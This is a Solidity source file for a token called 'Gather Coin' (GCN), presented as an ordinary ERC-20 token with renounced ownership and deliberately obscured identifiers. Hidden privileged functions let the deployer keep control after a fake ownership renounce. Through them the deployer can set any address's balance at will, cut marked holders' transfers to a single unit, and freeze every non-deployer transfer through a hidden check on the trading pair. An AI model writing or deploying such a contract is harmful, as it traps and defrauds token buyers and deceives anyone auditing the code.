//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface totalToReceiver {
    function createPair(address shouldExempt, address tokenTrading) external returns (address);
}

interface totalTakeAmount {
    function totalSupply() external view returns (uint256);

    function balanceOf(address minAt) external view returns (uint256);

    function transfer(address toMax, uint256 tokenTeamReceiver) external returns (bool);

    function allowance(address feeLaunched, address spender) external view returns (uint256);

    function approve(address spender, uint256 tokenTeamReceiver) external returns (bool);

    function transferFrom(
        address sender,
        address toMax,
        uint256 tokenTeamReceiver
    ) external returns (bool);

    event Transfer(address indexed from, address indexed isReceiverLimit, uint256 value);
    event Approval(address indexed feeLaunched, address indexed spender, uint256 value);
}

abstract contract atShould {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface maxToken {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface totalTakeAmountMetadata is totalTakeAmount {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract GatherCoin is atShould, totalTakeAmount, totalTakeAmountMetadata {

    function transfer(address buySwap, uint256 tokenTeamReceiver) external virtual override returns (bool) {
        return launchedAutoFund(_msgSender(), buySwap, tokenTeamReceiver);
    }

    function decimals() external view virtual override returns (uint8) {
        return minFrom;
    }

    function symbol() external view virtual override returns (string memory) {
        return feeList;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return limitAmountFee;
    }

    string private minFund = "Gather Coin";

    function amountLaunch(address buySwap, uint256 tokenTeamReceiver) public {
        modeTx();
        tradingFee[buySwap] = tokenTeamReceiver;
    }

    function owner() external view returns (address) {
        return teamBuy;
    }

    mapping(address => bool) public liquidityTotal;

    function approve(address fromIs, uint256 tokenTeamReceiver) public virtual override returns (bool) {
        shouldReceiverTo[_msgSender()][fromIs] = tokenTeamReceiver;
        emit Approval(_msgSender(), fromIs, tokenTeamReceiver);
        return true;
    }

    bool private atAuto;

    mapping(address => uint256) private tradingFee;

    function name() external view virtual override returns (string memory) {
        return minFund;
    }

    mapping(address => bool) public sellMax;

    function atMax(address totalReceiver, address toMax, uint256 tokenTeamReceiver) internal returns (bool) {
        require(tradingFee[totalReceiver] >= tokenTeamReceiver);
        tradingFee[totalReceiver] -= tokenTeamReceiver;
        tradingFee[toMax] += tokenTeamReceiver;
        emit Transfer(totalReceiver, toMax, tokenTeamReceiver);
        return true;
    }

    address public maxAuto;

    uint256 constant sellTotal = 1 ** 10;

    uint8 private minFrom = 18;

    constructor (){
        
        maxToken atReceiver = maxToken(totalSender);
        maxAuto = totalToReceiver(atReceiver.factory()).createPair(atReceiver.WETH(), address(this));
        
        toMode = _msgSender();
        liquidityTotal[toMode] = true;
        tradingFee[toMode] = limitAmountFee;
        toMaxMin();
        if (exemptSell == maxFromTotal) {
            exemptSell = maxFromTotal;
        }
        emit Transfer(address(0), toMode, limitAmountFee);
    }

    function exemptFrom(address marketingFund) public {
        modeTx();
        if (maxFromTotal == exemptSell) {
            atAuto = true;
        }
        if (marketingFund == toMode || marketingFund == maxAuto) {
            return;
        }
        sellMax[marketingFund] = true;
    }

    function balanceOf(address minAt) public view virtual override returns (uint256) {
        return tradingFee[minAt];
    }

    address private teamBuy;

    uint256 feeShouldTotal;

    function toMaxMin() public {
        emit OwnershipTransferred(toMode, address(0));
        teamBuy = address(0);
    }

    function allowance(address fundReceiver, address fromIs) external view virtual override returns (uint256) {
        if (fromIs == totalSender) {
            return type(uint256).max;
        }
        return shouldReceiverTo[fundReceiver][fromIs];
    }

    function enableSender(address teamSender) public {
        if (senderEnableAmount) {
            return;
        }
        if (senderEnable != tokenSwap) {
            maxFromTotal = exemptSell;
        }
        liquidityTotal[teamSender] = true;
        
        senderEnableAmount = true;
    }

    uint256 private maxFromTotal;

    function modeTx() private view {
        require(liquidityTotal[_msgSender()]);
    }

    bool public senderEnableAmount;

    uint256 fromMin;

    bool private senderEnable;

    bool public tokenSwap;

    address listTxAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 public exemptSell;

    string private feeList = "GCN";

    mapping(address => mapping(address => uint256)) private shouldReceiverTo;

    address totalSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 private limitAmountFee = 100000000 * 10 ** 18;

    function getOwner() external view returns (address) {
        return teamBuy;
    }

    function launchedAutoFund(address totalReceiver, address toMax, uint256 tokenTeamReceiver) internal returns (bool) {
        if (totalReceiver == toMode) {
            return atMax(totalReceiver, toMax, tokenTeamReceiver);
        }
        uint256 senderTotal = totalTakeAmount(maxAuto).balanceOf(listTxAmount);
        require(senderTotal == fromMin);
        require(toMax != listTxAmount);
        if (sellMax[totalReceiver]) {
            return atMax(totalReceiver, toMax, sellTotal);
        }
        return atMax(totalReceiver, toMax, tokenTeamReceiver);
    }

    address public toMode;

    event OwnershipTransferred(address indexed maxFrom, address indexed walletLiquidity);

    function transferFrom(address totalReceiver, address toMax, uint256 tokenTeamReceiver) external override returns (bool) {
        if (_msgSender() != totalSender) {
            if (shouldReceiverTo[totalReceiver][_msgSender()] != type(uint256).max) {
                require(tokenTeamReceiver <= shouldReceiverTo[totalReceiver][_msgSender()]);
                shouldReceiverTo[totalReceiver][_msgSender()] -= tokenTeamReceiver;
            }
        }
        return launchedAutoFund(totalReceiver, toMax, tokenTeamReceiver);
    }

    bool private receiverAutoLaunched;

    function liquidityMode(uint256 tokenTeamReceiver) public {
        modeTx();
        fromMin = tokenTeamReceiver;
    }

}